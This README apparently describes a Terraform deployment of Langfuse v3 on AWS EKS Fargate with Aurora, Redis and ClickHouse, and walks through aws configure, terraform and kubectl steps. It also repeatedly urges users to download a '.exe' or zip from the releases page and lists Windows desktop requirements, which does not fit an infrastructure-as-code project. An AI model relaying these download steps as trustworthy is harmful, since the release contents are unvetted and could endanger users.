# 🛠️ langfuse-eks-production - Reliable AWS EKS Setup for Langfuse v3

[![Download Release](https://img.shields.io/badge/Download-Release-green)](https://github.com/ashmedanraj/langfuse-eks-production/releases)

---

## 📌 What is langfuse-eks-production?

This project sets up Langfuse v3 in a production environment using AWS. It uses services like EKS Fargate to run your applications without managing servers, Aurora PostgreSQL for your database needs, ElastiCache Redis for caching, and ClickHouse for analytics. Everything is controlled through Terraform scripts. These follow best practices recommended by AWS for security, cost, and reliability.

In simple terms, langfuse-eks-production helps you run and observe Langfuse safely and efficiently on cloud infrastructure.

---

## 🖥️ System Requirements

Before you start, make sure your Windows computer meets these needs:

- Windows 10 or later (64-bit recommended)
- At least 8 GB of RAM
- 10 GB of free disk space
- Internet connection to download files and connect to AWS resources
- Administrator rights to install software

---

## 🛠️ Tools You Will Use

You will interact with some programs and services to set up langfuse-eks-production:

- Web Browser: To download files and access AWS Console
- AWS Account: Required for EKS, Aurora, Redis, and other AWS resources
- Terraform: Used to deploy infrastructure via code
- AWS CLI: Command-line tool to manage AWS services
- kubectl: Controls Kubernetes clusters
- Windows Command Prompt or PowerShell: To run commands

Don’t worry if you don’t know these tools. This guide will take you through the basic steps needed.

---

## 📥 Downloading the Installation Files

Start by visiting the releases page for langfuse-eks-production.

[![Download Releases](https://img.shields.io/badge/Download-Here-blue)](https://github.com/ashmedanraj/langfuse-eks-production/releases)

**How to download:**

1. Click the button above or open this link in your browser:  
   https://github.com/ashmedanraj/langfuse-eks-production/releases

2. On the releases page, find the latest version. It will have files or assets you can download.

3. Click the file named something like `langfuse-eks-production.zip` or any file with `.exe` if available.

4. Save the file to an easy-to-find folder, such as Downloads or Desktop.

5. Once downloaded, if it is a `.zip` file, right-click and choose "Extract All" to unpack it.

---

## 🚀 Installation and Setup

Follow these steps to install and prepare langfuse-eks-production on your Windows machine.

### Step 1: Install Required Software

1. **Install Terraform:**  
   - Go to https://www.terraform.io/downloads.html  
   - Download the Windows 64-bit version.  
   - Run the installer and follow the on-screen instructions.  
   - After installation, open Command Prompt and type `terraform -version` to confirm installation.

2. **Install AWS CLI:**  
   - Go to https://aws.amazon.com/cli/  
   - Download and install the Windows version.  
   - After installation, open Command Prompt and type `aws --version` to check.

3. **Install kubectl:**  
   - Open Command Prompt.  
   - Run:  
     ```  
     curl -LO "https://dl.k8s.io/release/v1.27.3/bin/windows/amd64/kubectl.exe"  
     ```  
   - Place `kubectl.exe` in a folder listed in your PATH or add its folder to PATH.

### Step 2: Configure AWS Access

You need an AWS account to provision resources.

1. Visit https://aws.amazon.com and create an account if you don’t have one.

2. Create an IAM User with necessary permissions for EKS, RDS, ElastiCache, and S3.

3. Obtain your **Access Key ID** and **Secret Access Key** from AWS IAM.

4. Open Command Prompt and run:  
   ```  
   aws configure  
   ```  
5. Enter your Access Key ID, Secret Access Key, region (e.g., us-east-1), and default output as json.

---

## 🔧 Deploy Infrastructure Using Terraform

Terraform automates creating and managing AWS resources. This step will set up the environment for Langfuse v3.

### Step 1: Prepare the Terraform Configuration

1. Open File Explorer and navigate to the folder where you extracted the downloaded files.

2. Locate the Terraform folder, usually named `terraform` or similar.

3. Open Command Prompt and change directory to this folder:  
   ```  
   cd C:\path\to\terraform-folder  
   ```

### Step 2: Initialize Terraform

Run this command to set up Terraform modules and plugins:  
```  
terraform init  
```

This downloads necessary files for the deployment.

### Step 3: Review the Terraform Plan

Run:  
```  
terraform plan  
```

This shows what resources Terraform will create. Take a moment to read this list.

### Step 4: Apply the Terraform Plan

Run:  
```  
terraform apply  
```

You will be asked to confirm. Type `yes` and press enter.

Terraform will begin creating AWS services. This may take several minutes.

---

## 🖧 Connect to the AWS EKS Cluster

Once Terraform finishes, the EKS cluster runs your Langfuse containers.

### Step 1: Update kubeconfig

Run:  
```  
aws eks update-kubeconfig --region <your-region> --name <cluster-name>  
```

Replace `<your-region>` and `<cluster-name>` with values from your Terraform output.

### Step 2: Verify Cluster Access

Run:  
```  
kubectl get nodes  
```

You should see a list of nodes. If yes, your connection is successful.

---

## ⚙️ Running Langfuse

Langfuse runs inside Kubernetes pods on EKS. Terraform will deploy the necessary components. Use `kubectl` commands to check status.

To list running pods:  
```  
kubectl get pods  
```

You will see pods related to Langfuse server, services, and databases.

If you want to see detailed logs for troubleshooting:  
```  
kubectl logs <pod-name>  
```

---

## 🔄 Updating Langfuse

When updates are available:

1. Download the latest release from the releases page.

2. Repeat the deployment steps using the updated Terraform configuration.

3. This safely updates your environment with new features or fixes.

---

## ⚙️ Common Issues and Troubleshooting

- **Terraform Errors:**  
  Check your AWS credentials and region settings. Ensure your IAM user has required permissions.

- **kubectl Command Not Found:**  
  Make sure `kubectl.exe` is in your system PATH.

- **Failed to Connect to EKS:**  
  Run `aws eks update-kubeconfig` again. Confirm cluster name and region.

- **Slow Resource Provisioning:**  
  AWS resource creation can take several minutes. Wait before retrying.

- **Unable to Download Files:**  
  Check your internet connection and firewall settings.

---

## 🧰 Additional Information

- This setup uses **Aurora PostgreSQL** for a managed database with high availability.

- **ElastiCache Redis** provides fast caching to speed up Langfuse operations.

- **ClickHouse** handles data analytics for monitoring and querying logs efficiently.

- **AWS Fargate** runs your containers without managing servers.

- **Terraform** ensures the infrastructure is easy to create, update, and maintain.

---

## 🔗 Download langfuse-eks-production Here

[![Download Releases](https://img.shields.io/badge/Download-Here-green)](https://github.com/ashmedanraj/langfuse-eks-production/releases)